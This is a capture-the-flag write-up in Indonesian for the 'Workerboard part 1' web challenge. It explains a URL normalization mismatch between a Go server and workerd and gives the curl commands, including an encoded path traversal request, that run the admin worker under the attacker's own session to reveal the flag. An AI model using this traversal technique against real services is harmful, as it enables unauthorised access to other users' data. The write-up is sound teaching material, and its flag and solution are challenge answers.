# Workerboard - Part 1

## Challenge Information

**Category:** Web  
**Challenge:** workerboard - part 1

> You know what they say: I like my objects durable and my V8 isolated.

---

## Overview

Workerboard merupakan aplikasi yang memungkinkan user membuat post berupa JavaScript Worker Script yang akan dieksekusi menggunakan `workerd` runtime.

Pada aplikasi terdapat beberapa post default, salah satunya adalah post milik admin:

```
secret!!!
```

Post tersebut berisi worker yang dapat mengeluarkan flag apabila kondisi tertentu terpenuhi.

Tujuan challenge ini adalah mendapatkan flag dari worker admin.

---

# Reconnaissance

Pertama membuat akun:

```bash
curl -sk -X POST $URL/api/register \
-H "Content-Type: application/json" \
-d '{"username":"nata","password":"nata"}'
```

Kemudian login:

```bash
curl -sk -i -c cookie.txt \
-X POST $URL/api/login \
-H "Content-Type: application/json" \
-d '{"username":"nata","password":"nata"}'
```

Setelah berhasil login, kita dapat melihat daftar post:

```bash
curl -sk -b cookie.txt $URL/api/posts
```

Output memberikan informasi:

```json
{
    "title":"secret!!!",
    "id":"ea90a63d-cb86-48bf-acb7-9de4ce771533",
    "author_name":"admin"
}
```

Kita mendapatkan ID worker milik admin:

```
ea90a63d-cb86-48bf-acb7-9de4ce771533
```

---

# Source Code Analysis

Pada endpoint render terdapat kode:

```go
publicPrefix := "/render/" + postID
suffix := strings.TrimPrefix(r.URL.Path, publicPrefix)

internalPath := "/serve/" + postID + suffix
```

Aplikasi mengambil path dari input user dan langsung menggabungkannya ke path internal worker.

Contoh:

Request:

```
/render/<post_id>
```

akan menjadi:

```
/serve/<post_id>
```

Namun tidak ada validasi atau sanitasi terhadap path tambahan yang diberikan user.

---

# Vulnerability

Vulnerability terdapat pada perbedaan normalisasi path antara Go HTTP server dan `workerd`.

Server hanya melakukan:

```go
strings.TrimPrefix()
```

tanpa mengecek adanya:

```
../
```

atau encoded traversal:

```
%2e%2e%2f
```

Sehingga attacker dapat mengakses worker lain melalui path traversal.

---

# Exploitation

Buat sebuah worker milik kita terlebih dahulu.

Contoh:

```javascript
export default {
 async fetch(req){
   return new Response("test")
 }
}
```

Misalkan ID worker kita:

```
adfc3dfb-e94a-49cb-bc59-78cff1f61246
```

ID worker admin:

```
ea90a63d-cb86-48bf-acb7-9de4ce771533
```

Kemudian lakukan path traversal:

```bash
curl -sk -b cookie.txt \
"$URL/render/adfc3dfb-e94a-49cb-bc59-78cff1f61246/%2e%2e%2fea90a63d-cb86-48bf-acb7-9de4ce771533"
```

---

# Why The Exploit Works

Request awal:

```
/render/user_worker/%2e%2e/admin_worker
```

oleh aplikasi diubah menjadi:

```
/serve/user_worker/../admin_worker
```

Kemudian `workerd` melakukan normalisasi path sehingga menjadi:

```
/serve/admin_worker
```

Akibatnya worker admin dijalankan.

Namun terdapat bug lain pada implementasi:

Metadata yang dikirim ke worker tetap menggunakan session user yang melakukan request.

Server mengirim:

```json
{
    "author_name":"nata",
    "author_id":"USER_ID",
    "viewer_name":"nata",
    "viewer_id":"USER_ID"
}
```

bukan data asli admin.

---

# Admin Worker Logic

Worker admin memiliki kondisi:

```javascript
if (
    author_id === viewer_id &&
    viewer_name === author_name
){
    flag = "FLAG"
}
```

Normalnya:

```
author = admin
viewer = attacker
```

sehingga kondisi gagal.

Tetapi akibat path traversal:

```
worker = admin worker
metadata = attacker metadata
```

sehingga:

```
author_name = nata
viewer_name = nata

author_id = user_id
viewer_id = user_id
```

Kondisi menjadi true dan flag diberikan.

---

# Final Exploit

```bash
curl -sk -b cookie.txt \
"$URL/render/adfc3dfb-e94a-49cb-bc59-78cff1f61246/%2e%2e%2fea90a63d-cb86-48bf-acb7-9de4ce771533"
```

Output:

```html
<h1>nata's secret storage</h1>

<p>
L3AK{Work3rd_ProN0UNCeD_woRk3R_dee_15_a_jaVasCR1Pt_Wasm_s3Rver_RUnt1me_ba5ed_on_tH3_s4m3_C0d3_tH47_poWeRs_cloUdf1aR3_W0rK3r5}
</p>
```

---

# Flag

```
L3AK{Work3rd_ProN0UNCeD_woRk3R_dee_15_a_jaVasCR1Pt_Wasm_s3Rver_RUnt1me_ba5ed_on_tH3_s4m3_C0d3_tH47_poWeRs_cloUdf1aR3_W0rK3r5}
```

---

# Conclusion

Challenge ini memanfaatkan bug **path traversal akibat URL normalization mismatch**.

Root cause:

```
User Input
    |
    v
strings.TrimPrefix()
    |
    v
/serve/<controlled path>
    |
    v
workerd normalizes path
```

Karena tidak ada validasi path, attacker dapat menjalankan worker milik admin tetapi menggunakan context session miliknya sendiri.

Vulnerability:

- Path Traversal
- Improper Path Sanitization
- URL Normalization Mismatch
